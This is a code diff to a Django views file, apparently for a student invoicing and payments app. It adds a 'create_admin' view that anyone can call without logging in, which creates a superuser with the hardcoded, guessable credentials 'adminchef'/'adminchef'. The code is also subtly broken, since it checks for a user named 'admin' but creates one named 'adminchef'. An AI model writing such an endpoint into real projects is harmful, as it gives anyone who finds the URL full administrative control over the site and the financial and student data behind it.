@@ -14,6 +14,21 @@ from django.utils import timezone
 
 from ..models import Transaction, Notification, Invoice, Payment, Student
 from .utils import build_excel_response, admin_required
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+def create_admin(request):
+    User = get_user_model()
+
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser(
+            username="adminchef",
+            email="admin@gmail.com",
+            password="adminchef"
+        )
+        return HttpResponse("Superuser created")
+
+    return HttpResponse("Superuser already exists")
 
 
 def check_overdue_invoices():
